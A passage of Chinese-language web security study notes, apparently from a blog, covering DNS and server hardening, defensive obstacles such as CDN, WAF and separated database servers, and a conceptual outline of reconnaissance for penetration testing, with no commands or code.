title="基于域名解析安全"></a>基于域名解析安全</h3><p>域名解析是将域名转换为IP地址的过程，其安全性至关重要。常见的安全问题包括DNS劫持和DNS欺骗。DNS劫持是指攻击者篡改DNS服务器记录，将用户访问的域名解析到错误的IP地址，从而实现攻击。DNS欺骗则是通过伪造DNS响应包，将用户引导至恶意网站。为了保障域名解析安全，可采取以下措施：</p><ul><li>使用可靠的DNS服务器，如Google DNS、OpenDNS等。</li><li>使用DNSSEC技术，对DNS响应包进行数字签名，保证其完整性和真实性。</li><li>使用DoH（DNS over HTTPS）或DoT（DNS over TLS）加密协议，保护DNS查询过程。</li><li>定期更新DNS记录，避免被篡改。</li></ul><h3 id="基于服务器本身安全"><a href="#基于服务器本身安全" class="headerlink" title="基于服务器本身安全"></a>基于服务器本身安全</h3><p>服务器本身的安全涉及多个方面，包括物理安全、操作系统安全、网络防护等。常见的安全威胁有数据漏洞、密码和证书问题、界面和API入侵、系统脆弱性等。防护措施主要包括：</p><ul><li>物理安全：将服务器放置在安全的机房，限制物理访问，安装监控和报警系统。</li><li>操作系统安全：进行最小化安装，关闭不必要的服务和端口，及时应用安全补丁和更新，使用强密码和多因素身份验证。</li><li>网络防护：部署防火墙、入侵检测和防护系统，使用VPN加密远程访问流量，配置安全组和网络访问控制列表。</li><li>数据加密：对敏感数据进行加密存储和传输，使用SSL&#x2F;TLS协议保护Web通信。</li><li>审计和监控：定期进行安全审计和监控，使用SIEM工具收集和分析安全日志。</li><li>备份和恢复：定期备份重要数据，测试备份数据的恢复过程。</li></ul><h3 id="基于服务商信息安全"><a href="#基于服务商信息安全" class="headerlink" title="基于服务商信息安全"></a>基于服务商信息安全</h3><p>服务商信息安全是指提供网络服务的公司或机构在保障用户数据和隐私安全方面的措施和责任。服务商需要采取严格的安全措施，如加强服务器和网络的安全防护，定期检查系统漏洞并及时修复。同时，服务商还应加强对员工的安全培训，防止内部人员泄露用户信息。此外，服务商应提供加密的通信渠道，如支持HTTPS协议，确保用户数据在传输过程中的安全。</p><h3 id="基于管理个人的安全"><a href="#基于管理个人的安全" class="headerlink" title="基于管理个人的安全"></a>基于管理个人的安全</h3><p>管理个人的安全主要是指个人用户在使用网络服务时，应采取的安全措施和注意事项。包括：</p><ul><li>加强安全意识，不要轻易相信来路不明的链接和网站，避免被黑客攻击。</li><li>使用安全软件，如杀毒软件、防火墙等，保护自己的电脑和网络安全。</li><li>定期检查DNS记录，避免被黑客篡改。</li><li>使用复杂的密码，并定期更换密码，避免使用弱密码。</li><li>限制对敏感信息的访问，只在必要时才提供个人信息。</li><li>定期备份重要数据，以防数据丢失或被窃取。</li></ul><h1 id="9-考虑阻碍"><a href="#9-考虑阻碍" class="headerlink" title="9.考虑阻碍"></a>9.考虑阻碍</h1><h3 id="阻碍-站库分离"><a href="#阻碍-站库分离" class="headerlink" title="阻碍-站库分离"></a>阻碍-站库分离</h3><p>站库分离是指将网站的前端（Web Server）和后端数据库（Database Server）部署在不同的服务器上。这种架构可以提高系统的安全性，因为即使Web Server受到攻击，攻击者也无法直接访问数据库Server，从而保护了数据库中的敏感信息。然而，实施站库分离可能会遇到一些阻碍，例如：</p><ul><li><strong>成本增加</strong>：需要额外的服务器资源来部署数据库，增加了硬件和运维成本。</li><li><strong>复杂性增加</strong>：需要管理更多的服务器和网络配置，增加了系统的复杂性。</li><li><strong>性能优化</strong>：需要确保Web Server和Database Server之间的网络连接高效，否则可能影响性能。</li></ul><h3 id="阻碍-CDN加速服务"><a href="#阻碍-CDN加速服务" class="headerlink" title="阻碍-CDN加速服务"></a>阻碍-CDN加速服务</h3><p>CDN（内容分发网络）加速服务是基于遍布全球的网络节点提供的内容分发加速服务，适用于加速网页站点、文件下载、视频点播等场景。CDN可以提高内容的加载速度，减少服务器的负载，但实施CDN加速服务也可能面临一些阻碍：</p><ul><li><strong>成本问题</strong>：CDN服务通常需要付费，尤其是对于高流量的网站，成本可能会较高。</li><li><strong>配置复杂</strong>：需要正确配置CDN的缓存策略、回源策略等，以确保内容的正确分发和更新。</li><li><strong>安全挑战</strong>：虽然CDN支持全链路HTTPS安全传输方案，但仍然需要确保源站的安全，防止数据被篡改或劫持。</li></ul><h3 id="阻碍-负载均衡服务"><a href="#阻碍-负载均衡服务" class="headerlink" title="阻碍-负载均衡服务"></a>阻碍-负载均衡服务</h3><p>负载均衡服务通过将网络流量分配到多个服务器上，提高系统的可用性和性能。然而，实施负载均衡服务也可能遇到一些阻碍：</p><ul><li><strong>成本增加</strong>：需要购买和维护负载均衡设备或服务，增加了成本。</li><li><strong>配置复杂</strong>：需要正确配置负载均衡策略，确保流量合理分配，避免单点故障。</li><li><strong>性能监控</strong>：需要持续监控负载均衡的效果，确保各服务器的负载均衡，否则可能导致部分服务器过载。</li></ul><h3 id="阻碍-WAF应用防火墙"><a href="#阻碍-WAF应用防火墙" class="headerlink" title="阻碍-WAF应用防火墙"></a>阻碍-WAF应用防火墙</h3><p>WAF（Web应用防火墙）是一种专门用于保护Web应用程序安全的防火墙设备或软件。它位于Web应用程序和客户端之间，可以监控、过滤和阻止通过Web应用程序的恶意请求。然而，实施WAF应用防火墙也可能面临一些阻碍：</p><ul><li><strong>性能影响</strong>：WAF可能会对Web应用的性能产生一定影响，需要优化配置以减少延迟。</li><li><strong>规则配置</strong>：需要不断更新和优化WAF的规则，以应对新的攻击手段，否则可能导致误报或漏报。</li><li><strong>成本问题</strong>：高质量的WAF解决方案通常需要付费，增加了安全成本。</li></ul><h3 id="阻碍-主机防护防火墙"><a href="#阻碍-主机防护防火墙" class="headerlink" title="阻碍-主机防护防火墙"></a>阻碍-主机防护防火墙</h3><p>主机防护防火墙是用于保护单个主机或服务器的安全防护软件，可以监控和控制进出主机的网络流量。然而，实施主机防护防火墙也可能面临一些阻碍：</p><ul><li><strong>性能影响</strong>：防火墙可能会对主机的性能产生一定影响，需要优化配置以减少资源消耗。</li><li><strong>规则配置</strong>：需要正确配置防火墙规则，以确保合法流量的通过，同时阻止恶意流量，否则可能导致误报或漏报。</li><li><strong>管理复杂</strong>：需要对每个主机进行单独的配置和管理，增加了运维的复杂性。</li></ul><h1 id="10-信息打点"><a href="#10-信息打点" class="headerlink" title="10.信息打点"></a>10.信息打点</h1><h2 id="1-信息点"><a href="#1-信息点" class="headerlink" title="1.信息点"></a>1.信息点</h2><p>基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等</p><h2 id="2-技术点"><a href="#2-技术点" class="headerlink" title="2.技术点"></a>2.技术点</h2><p> CMS识别，端口扫描，CDN绕过，源码获取，子域名查询，WAF识别，负载均衡识别等</p><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><h3 id="打点-Web架构-语言：中间件：数据库＆系统等"><a href="#打点-Web架构-语言：中间件：数据库＆系统等" class="headerlink" title="打点-Web架构-语言：中间件：数据库＆系统等"></a>打点-Web架构-语言：中间件：数据库＆系统等</h3><ul><li><strong>Web架构</strong>：指网站或Web应用的总体结构和组件之间的关系。它包括前端和后端的各个部分，以及它们之间的交互方式。</li><li><strong>语言</strong>：指用于开发Web应用的编程语言，如PHP、Java、Python等。不同的语言有不同的特点和适用场景，比如PHP适合快速开发小型网站，Java适合大型企业级应用。</li><li><strong>中间件</strong>：是位于客户端和服务器端之间的软件，起到承上启下的作用。它可以处理请求、提供各种服务，如负载均衡、缓存等。常见的中间件有Apache、Nginx等。</li><li><strong>数据库</strong>：用于存储和管理数据的系统，如MySQL、Oracle、MongoDB等。Web应用通过数据库来持久化存储用户信息、文章内容等数据。</li><li><strong>系统</strong>：指服务器的操作系统，如Windows、Linux等。不同的操作系统对Web应用的部署和运行有不同的影响，比如Linux系统在服务器端应用广泛，因其稳定性和安全性较高。</li></ul><h3 id="打点-w-b源码-CMS开源＆闭源售卖：自主研发等"><a href="#打点-w-b源码-CMS开源＆闭源售卖：自主研发等" class="headerlink" title="打点- w &#x3D; b源码-CMS开源＆闭源售卖：自主研发等"></a>打点- w &#x3D; b源码-CMS开源＆闭源售卖：自主研发等</h3><ul><li><strong>CMS开源</strong>：内容管理系统（CMS）的源代码是公开的，可以在网上搜索并免费下载使用。这类源码的使用者可能不太重视安全，因为其代码是公开的，容易被分析和攻击，例如一些小型的个人博客网站可能会使用开源CMS。</li><li><strong>闭源售卖</strong>：源代码不公开，需要从内部获取或者花钱购买。源代码可能被加密，以保护其知识产权和安全性。</li><li><strong>自主研发</strong>：企业或团队自己开发的源码，仅用于内部使用，不想让外部知道其细节。像淘宝、京东等大型网站通常会自主研发源码，以满足其独特的业务需求和保障核心竞争力。</li></ul><h3 id="打点-Web源码获取-泄露安全。资源监控：其他等"><a href="#打点-Web源码获取-泄露安全。资源监控：其他等" class="headerlink" title="打点-Web源码获取-泄露安全。资源监控：其他等"></a>打点-Web源码获取-泄露安全。资源监控：其他等</h3><ul><li><strong>泄露安全</strong>：指Web源码泄露后可能带来的安全风险。一旦源码泄露，攻击者可以分析其中的漏洞，进而对网站进行攻击，如注入攻击、跨站脚本攻击等。</li><li><strong>资源监控</strong>：通过监控各种资源平台，如GitHub、Gitee等，来获取Web源码。有些开发者可能会在这些平台上无意中泄露源码，或者一些开源项目可以被用于研究和学习。</li><li><strong>其他</strong>：还包括通过网站爆源码等方式获取源码。爆源码是指网站由于配置错误等原因，导致源码文件被直接暴露在可访问的目录下，从而被获取。</li></ul><h3 id="打点-Web域名-子域名。相似域名＆反查域名＆旁注等"><a href="#打点-Web域名-子域名。相似域名＆反查域名＆旁注等" class="headerlink" title="打点-Web域名-子域名。相似域名＆反查域名＆旁注等"></a>打点-Web域名-子域名。相似域名＆反查域名＆旁注等</h3><ul><li><strong>子域名</strong>：是在主域名之前添加的前缀，形式为subdomain.domain.com。通过查找目标域名的子域名，可以获得更多有关目标系统和网络的信息。例如，一个公司可能会有多个子域名用于不同的业务部门或服务。</li><li><strong>相似域名</strong>：指与目标域名在拼写、发音或外观上非常相似的域名。攻击者可能注册这些相似域名，以进行钓鱼攻击、恶意软件传播等活动。对于目标域名，建议检查相似域名的注册情况，以防范潜在的攻击。</li><li><strong>反查域名</strong>：通过目标域名的IP地址，查找与之关联的其他域名。这可以帮助发现目标域名所在的服务器上托管的其他网站或服务。可以使用反查工具如Bing反查、DNS反查等来执行反查域名操作。</li><li><strong>旁注</strong>：一个服务器上既搭建了目标网站，又有其他网站，这里的其他网站就是旁注。攻击者可能会利用旁注网站的漏洞来攻击目标网站，或者通过旁注网站获取目标网站的信息。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
